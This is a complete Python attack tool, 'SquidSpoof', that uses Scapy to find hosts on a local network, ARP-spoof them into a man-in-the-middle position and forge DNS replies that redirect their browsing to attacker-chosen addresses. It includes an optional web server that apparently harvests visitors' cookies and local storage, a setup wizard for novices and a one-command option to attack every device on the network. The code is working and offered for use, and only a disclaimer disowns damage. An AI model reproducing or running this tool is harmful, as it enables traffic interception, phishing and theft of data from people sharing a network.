# x-----------------------------------------x
#   SquidSpoof - DNS Cache Poisoner Script
#              By Adrian Fang
#
#   Any damage that I am not involved in
#   is not my fault. Happy Hacking.
# x-----------------------------------------x
import threading, warnings, logging, os, sys, re
from optparse import OptionParser

_log = logging.getLogger('werkzeug')
_log.disabled = True
_log.setLevel(logging.ERROR)

warnings.filterwarnings("ignore") 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
RUN_WEBSITE = False
IFACE = "en0"
targets = []
verbose = True

spoof_every_req = False
dns_spoof = {}
dns_whitelist = []
ip_whitelist = []
ipls = {}
spoof = True

print("""  _________            .__    .____________                     _____ 
 /   _____/ ________ __|__| __| _/   _____/_____   ____   _____/ ____\\
 \_____  \ / ____/  |  \  |/ __ |\_____  \\ ____ \ /  _ \ /  _ \   __\ 
 /        < <_|  |  |  /  / /_/ |/        \  |_> >  <_> |  <_> )  |   
/_______  /\__   |____/|__\____ /_______  /   __/ \____/ \____/|__|   
        \/    |__|             \/       \/|__|                        
DNS-Cache Poisoning Script by Adrian Fang""")
try:
    from scapy.all import DNSRR, Ether, IP, UDP, DNS, sendp, sniff, send, ARP, srp
except:
    print("[!] Scapy is required for this script to function! Please install it through: pip install scapy")
    sys.exit()

class ARP_Spoof:
    """
    # ARP Spoofing Class

    The attack used to give the attacker the ability to intercept network traffic from targets, effectively allowing for
    DNS Spoofing.
    """
    @staticmethod
    def get_mac(ip):
        """
        Sends and ARP Broadcast to get the MAC Address of the specified IP Address
        """
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1,pdst=ip)
        return srp(pkt,verbose=False)[0][0][1].hwsrc
    def __init__(self, target, gateway,tmac=None,gmac=None):
        self.target = target
        self.gateway = gateway
        self.tmac = tmac
        self.gmac = gmac
        self.attack = True
        if self.tmac is None:
            self.tmac = self.get_mac(self.target)
            self.gmac = self.get_mac(self.gateway)
            print(self.tmac, self.gmac)
    def send_spoofed_pkt(self, source_ip, hwdst,target_ip):
        """
        Sends a spoofed ARP packet to effectively trick the target into "thinking" that the
        source IP is the attacker
        """
        pkt = ARP(op=2,pdst=target_ip,hwdst=hwdst,psrc=source_ip)
        send(pkt,verbose=False)
    def restore_arp_cache(self, hwsrc,hwdst,pdst,psrc):
        """
        Restores the ARP cache by sending a packet to the target with all of the correct information
        from the source
        """
        pkt = ARP(op=2,hwsrc=hwsrc,hwdst=hwdst,pdst=pdst,psrc=psrc)
        send(pkt,verbose=False)
    def atk(self):
        """
        ARP Spoofing loop, sending spoofed packets to both the target and router
        """
        global spoof
        while spoof:
            try:
                self.send_spoofed_pkt(self.target,self.gmac,self.gateway)
                self.send_spoofed_pkt(self.gateway,self.tmac,self.target)
            except:
                pass 
        self.restore_arp_cache(self.gmac,self.tmac,self.target,self.gateway)
        self.restore_arp_cache(self.tmac,self.gmac,self.gateway,self.target)
        print(f"[*] Restoring the ARP Cache for {self.target} ({self.tmac}).")

def get_input(quest,success_crit,is_int=False):
    """
    A recursive input function that will ensure that the user makes a value input
    based on the provided success criteria.
    """
    val = input(quest)
    if not success_crit(val):
        print("[!] Invalid answer!")
        return get_input(quest,success_crit,is_int)
    if is_int:
        return int(val)
    return val

def spoof_all():
    """
    Function that iterates through every single uncovered target and poisons their ARP Cache if the IP is not in the whitelist.
    """
    for ip, mac in ipls.items():
        if (targeting and ip not in targets) or ip in ip_whitelist:
            continue
        print(f"[*] Conducing ARP Spoofing attack on {ip} ({mac}).")
        ncls = ARP_Spoof(ip, gateway_ip, mac, gateway_mac)
        thr = threading.Thread(target=ncls.atk)
        thr.start()

def dns_reply(packet):
    """
    Function that takes the sniffed DNS query and crafts a spoofed DNS response
    to poison the DNS cache of the sender

    Spoofing occurs when the domain is either in the spooflist, the target is in the targets or if the ip and domain do not reside in the DNS and IP whitelists.

    Hold on! Did you notice the sendp and send functions? Scapy's send() and sendp() functions are used for layer 2 and 3 (the network and transmission layers) of the OSI model respectively.
        - send() is used in ARP Spoofing since it involves the exploitation of the ARP protocol (a layer 2 protocol)
        - sendp() is used in DNS Spoofing, since it's a UDP or layer 3 protocol.
            - Although DNS itself would theoretically be at the application layer (number 7), scapy crafts everything needed, using the sendp() or send() functions to transmit data, used by layers 2 and 3.
    """
    spoofed_ip = dns_spoof.get(packet["DNS Question Record"].qname.decode())
    if (spoofed_ip or spoof_every_req) and packet["DNS Question Record"].qname.decode() not in dns_whitelist and ((IP in packet and packet[IP].src in targets) or not targeting):
        eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
        ip = IP(src=packet[IP].dst,dst=packet[IP].src)
        udp = UDP(sport=packet[UDP].dport,dport=packet[UDP].sport)
        dns = DNS(
            # Simplification of the first half of the packet
            id=packet[DNS].id,qd=packet[DNS].qd,aa=1,rd=0,qr=1,qdcount=1,ancount=1,nscount=0,arcount=0,

            # Original Half of the packet, derived from packet sniffing
            #id=packet[DNS].id,qr=1,opcode=packet[DNS].opcode,aa=0,tc=0,rd=1,ra=1,ad=0,cd=0,z=0,rcode=packet[DNS].rcode,ancount=1,qdcount=1,nscount=0,arcount=1,qd=packet[DNS].qd,
            an=DNSRR(rrname=packet[DNS].qd.qname, type='A', ttl=2048, rdata=spoofed_ip if spoofed_ip else global_spoofed_ip)
        )
        pkt = eth / ip / udp / dns
        sendp(pkt, verbose=False)
        if verbose:
            print(f"[*] Sent Spoofed DNS Packets to {packet[IP].src} - {packet['DNS Question Record'].qname.decode()} -> {spoofed_ip if spoofed_ip else global_spoofed_ip}")
    
def log(pkt,file="IPs.txt"):
    """
    Logs important data, such as IP and MAC addresses, or cookies and local storage data from the evil webserver
    """
    if file not in os.listdir():
        open(file,"w").close()
    of = open(file,"r").read()
    f = open(file,"w")
    f.write(of)
    f.write(pkt+"\n")
    f.close()

def parse_pkt(pkt):
    """
    Packet parsing function to uncover hosts on the network

    I reworked my original implementation since OOP would be too much for such a simple task.

    The parse packet function takes a packet as an argument (which would be provided in the sniff() function), looking for IP and Ethernet
    headers which is important information for ARP Spoofing.
    """
    try:
        ip = pkt[0][IP].src
        eth = pkt[0][Ether].src
        if not ipls.get(ip) and ip != gateway_ip and ip != own_ip and str(ip).startswith(subnet_prefix) and ip not in ip_whitelist:
            print(f"[*] Uncovered Host from IP Source header - IP: {ip} MAC: {eth}")
            log(f"{ip} {eth}")
            ipls[ip] = eth
    except Exception as e:
        pass

def help_msg():
    print(f"""Usage: ./{sys.argv[0].split('/')[-1]} [--ip IP(s)] [options]\nOptions:\n  -h, --help               Shows this help message and exits.\n  -i, --info               Shows this message and some more information and exits.\n  --ip, --ipaddr           The IP Address(es) that will be spoofed, seperated by \n                           commas. (ex. '192.168.1.2,192.168.1.3')\n  --gs, --globalspoof      Choose to target every device uncovered in the network \n                           scan.\n  --hf, --hostsfile        The file containing which domain redirect to which IP address.\n  --sa, --spoofall         Spoof every single DNS Request not in the hosts file to \n                           resolve into one IP address.\n  --ws, --webserver        Will host a website for victims to connect to on 0.0.0.0:443.\n  --iface, --interface     The interface to send spoofed packets on.\n  --ipwl, --ipwhitelist    Specify IP addresses to avoid attacking if conducting a global spoof,\n                           seperated by commas. (ex. '192.168.1.2,192.168.1.3')\n  --dnswl, --dnswhitelist  Specify domain names to avoid spoofing if spoofing every DNS request, \n                           seperated by commas. (ex. 'google.com,random.com')\n  --sw, --setupwizard      A CLI setup wizard for non-techsavvy users. Functionality will be the\n                           same, albeit with a few limitations.\nExamples: \n  ./{sys.argv[0].split('/')[-1]} --ip 192.168.1.5,192.168.1.10 --hf hosts.txt --ws --iface en0\n  ./{sys.argv[0].split('/')[-1]} --sa 192.168.1.157 --gs""")

def info_msg():
    print(f"""\nAbout SquidSpoof and the Theory of DNS-Cache Poisoning:\n  SquidSpoof is a DNS-Cache poisoning script which assumes access to the target network. Targets are uncovered\n  by scanning sniffed packets using information obtained about the subnet and gateway, which will reveal the\n  IP and MAC Addresses for the attack. To attack the network, malicious spoofed ARP packets are sent to target \n  machines and the gateway, forcing network traffic to be sent to the attacker machine for interception. This\n  script will intercept DNS traffic and send modified versions of the packets to targets to redirect them to\n  specified IP Addresses.\n  In other words: This script intercepts the DNS traffic of other devices via spoofing and acts as a malicious \n  DNS Server to those requests.\n  \n  If a hacker can control the websites that you visit, they fundamentally "win". At least that's what James Lyne\n  says!\n          \nHow to attack\n  Simply run './{sys.argv[0].split('/')[-1]} --sa self --gs' to attack the entire network! You will need to run a\n  seperate server to see targets connect to a different source. \n  You can also use the setup wizard, by doing './{sys.argv[0].split('/')[-1]} --sw'.\n  FYI: The 'self' parameter is a placeholder for your IP.\n  \nChoosing attack methods:\n  Although there is one concrete method to conduct DNS Spoofing, SquidSpoof offers a few options when it comes\n  to targeting devices. You can choose either to attack the entire network, or attack a select few devices by\n  specifying the IP Addresses. \n  Attacking the entire network:\n    ./{sys.argv[0].split('/')[-1]} --gs [options]\n    ./{sys.argv[0].split('/')[-1]} --ip [IP(s)] [options]\n  Examples for targeting:\n    ./{sys.argv[0].split('/')[-1]} --ip 192.168.1.90,192.168.1.65 --ws --sa 192.168.1.7\n    ./{sys.argv[0].split('/')[-1]} --ip 192.168.1.90 --ws --hf hosts.txt\n  Examples for the attacking the entire network:\n    ./{sys.argv[0].split('/')[-1]} --gf --sa 192.168.1.7\n    ./{sys.argv[0].split('/')[-1]} --gf --ws --hf hosts.txt\nFormatting the spoofed hosts file\n  If you want to spoof specific DNS Requests, consider using a hosts file of some sort. If you have ever worked with\n  the /etc/hosts file on MacOS or Linux, the format of SquidSpoof's host file is the same, but reversed. Below is an\n  example of the file:\n    goofy.com 192.168.1.7\n    silly.com 192.168.1.8\n    somedumbwebsite 192.168.1.7\n    test.com 192.168.1.7\n    fbi.gov 192.168.1.7\n""")

args = OptionParser(add_help_option=False)
args.add_option('-h','--help', dest="h",action="store_true",help='Show this help message and exit.')
args.add_option('-i','--info', dest="i",action="store_true",help='Show this help message and exit.')
args.add_option("--ip","--ipaddr",dest="ip",help="The IP Address(es) that will be spoofed, seperated by commas (ex. '192.168.1.2,192.168.1.3').")
args.add_option("--ipwl","--ipwhitelist",dest="ipwl",help="Specify IP addresses to avoid attacking if conducting a global spoof.")
args.add_option("--dnswl","--dnswhitelist",dest="dwl",help="Specify domains to avoid spoofing.")
args.add_option("--gs","--globalspoof",action="store_true",dest="gs",help="Target every device uncovered in the network scan.")
args.add_option("--hf","--hostsfile",dest="hf",help="The file containing which domain redirect to which ip address.")
args.add_option("--sa","--spoofall",dest="sa",help="Spoof every single DNS Request not in the hosts file to resolve into one IP address.")
args.add_option("--ws","--webserver",dest="ws",action="store_true",help="Will host a website for users to connect to.")
args.add_option("--iface","--interface",dest="iface",help="The interface to send spoofed packets on.")
args.add_option("--sw","--setupwizard",dest="sw",action="store_true",help="A setup wizard to help with configuring the DNS Spoofing. For non tech nerds!")
opt, arg = args.parse_args()
if opt.i is not None:
    info_msg()
    help_msg()
    sys.exit()
if opt.sw is not None:
    """
    The website will automatically be enabled for the setup wizard.

    I could add more to this to increase the complexity of the attack via the setup wizard, however I decided to keep things simple for the non-techy users.
    """
    RUN_WEBSITE = True
    print("""[*] Welcome to the setup wizard!
[*] To make things easier for you, the program will be configured to spoof every single DNS request.""")
    targeting = get_input("[*] Do you want to target specific IP addresses?: ",lambda x: x.lower() == "yes" or x.lower() == "no").lower()
    amount_targets = 0 if targeting != "yes" else get_input("[*] How many targets?: ",lambda x: x.isdigit(), True)
    opt.ip = None if amount_targets == 0 else ""
    for i in range(amount_targets):
        opt.ip += get_input("[*] Enter an IP address: ",lambda x: len(x.split(".")) == 4 and all(x.isdigit() and int(x) in range(0,256) for x in x.split("."))) + ","
    if opt.ip is not None:
        opt.ip = opt.ip[:-1]
    verbose = False
    opt.sa = "self"
if opt.h is not None:
    help_msg()
    sys.exit()
if (opt.ip is None and opt.gs is None) or (opt.sa is None and opt.hf is None):
    print("[!] You must choose between specifying targets or the entire network to spoof." if opt.ip is None and opt.sa is None else "[!] Please specify whether to spoof every request or a select few.")
    help_msg()
    sys.exit()
if opt.ip is not None:
    targeting = True
    targets = opt.ip.split(",")
if opt.iface is not None:
    IFACE = opt.iface
if sys.platform != "win32":
    ifconfig = os.popen(f"ifconfig {IFACE} inet").read().splitlines()
    own_ip = ifconfig[-1].split()[1] #"192.168.68.100"
else:
    own_ip = input("[*] Please enter your local IP: ")
packet_filter = " and ".join([
    "udp dst port 53",        
    "udp[10] & 0x80 = 0", # DNS queries only
    f"not src host {own_ip}"
])
if opt.sa is not None:
    spoof_every_req = True
    global_spoofed_ip = opt.sa if opt.sa != "self" else own_ip
if opt.gs is not None:
    targeting = False
if opt.ws is not None:
    RUN_WEBSITE = True
if opt.ipwl is not None:
    ip_whitelist = opt.ipwl.split(",")
if opt.dwl is not None:
    dns_whitelist = [x + "." for x in opt.dwl.split(",")]
if opt.hf is not None:
    try:
        f = open(opt.hf,"r").read()
        dns_spoof = {}
        for i in f.splitlines():
            dns_spoof[i.split()[0] + "."] = i.split()[1]
            print(f"[*] Redirection Rule Added: {i.split()[0]} -> {dns_spoof[i.split()[0] + '.']}")
    except FileNotFoundError:
        print(f"[!] The file '{opt.hf}' does not exist. Did you make a typo?")
        sys.exit()
    except:
        print("[!] Invalid formatting of the hosts file!\n    Example format:\n    google.com 192.168.1.5\n    discord.com 192.168.1.5\n    www.kali.org 192.168.1.7")
        sys.exit()

if RUN_WEBSITE:
    try:
        from webserver import *
    except:
        print("[!] Flask it not installed, meaning a website will not be hosted. Please install 'flask' through: pip install flask")
        RUN_WEBSITE = False

if sys.platform == "darwin":
    gateway_ip = re.findall(r"gateway: (.*)",os.popen("route -n get default").read())[0]
    subnet_prefix = ""
    subnet_mask = ifconfig[-1].split()[3][2:]
    for i in range(0,len(subnet_mask),2):
        if subnet_mask[i] + subnet_mask[i + 1] == "ff": 
            subnet_prefix += gateway_ip.split(".")[i//2] + "."
else:
    print("[!] Since you're not on a MacOS device, please enter your gateway manually.")
    gateway_ip = input("[*] Gateway: ")
    subnet_prefix = input("[*] Please enter what the target IP addresses should start with (ex. '192.168.1.'): ")

gateway_mac = ARP_Spoof.get_mac(gateway_ip)

if targeting:
    print(f"[!] You are in target mode! Only these IP Addresses will be attacked: {targets}")
if len(ip_whitelist) > 0:
    print(f"[!] Using an IP Whitelist. The following IP Addresses will not be attacked: {ip_whitelist}")
if len(dns_whitelist) > 0:
    print(f"[!] Using a DNS Whitelist. The following domains will not be spoofed: {dns_whitelist}")

"""
######################################
# The actual execution of the attack #
######################################
"""
# Conducting reconnaissance to find active hosts without port scanning, followed by ARP Spoofing for a MITM Attack
print("[*] Uncovering hosts through packet sniffing. Press Ctrl C to begin spoofing.")
sniff(prn=parse_pkt, iface=IFACE)
spoof_all()

# Sniffing for DNS packets to spoof DNS requests
print("[*] Sniffing for DNS Packets... Press Ctrl C to stop the attack. The script will continue executing until you stop it!")
if RUN_WEBSITE:
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *x: None
    print("[*] Troll Website created!")
    thr = threading.Thread(target=start_server,)
    thr.start()
    thr2 = threading.Thread(target=start_server2,)
    thr2.start()
sniff(filter=packet_filter, prn=dns_reply, iface=IFACE)

# Ending the attacks
spoof = False
print("[*] Restoring the ARP Cache and stopping the DNS Spoofing...")
print("[*] Exiting...")
